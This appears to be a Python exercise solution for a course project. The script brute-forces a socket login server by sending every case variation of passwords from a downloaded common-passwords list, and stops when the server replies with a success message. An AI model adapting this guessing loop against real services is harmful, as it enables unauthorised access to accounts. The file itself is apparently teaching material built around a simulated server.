import argparse
import socket
from itertools import product
from urllib import request


def get_common_passwords():
    url = r'https://stepik.org/media/attachments/lesson/255258/passwords.txt'
    data = request.urlopen(url)
    return list(data)


def mutate_word(word):
    word = word.decode().strip()
    lower_word = word.lower()
    upper_word = word.upper()
    return [''.join(i) for i in product(*zip(lower_word, upper_word))]


def connect(args):
    with socket.socket() as sock:
        pwds = get_common_passwords()
        sock.connect((args.hostname, args.port))
        for pwd in pwds:
            for word in mutate_word(pwd):
                sock.send(word.encode())
                response = sock.recv(1024).decode()
                if 'Wrong password!' in response:
                    continue
                if 'Connection success!' in response:
                    print(word)
                    return
                elif 'Too many attempts' in response:
                    return


parser = argparse.ArgumentParser()
parser.add_argument('hostname')
parser.add_argument('port', type=int)
connect(parser.parse_args())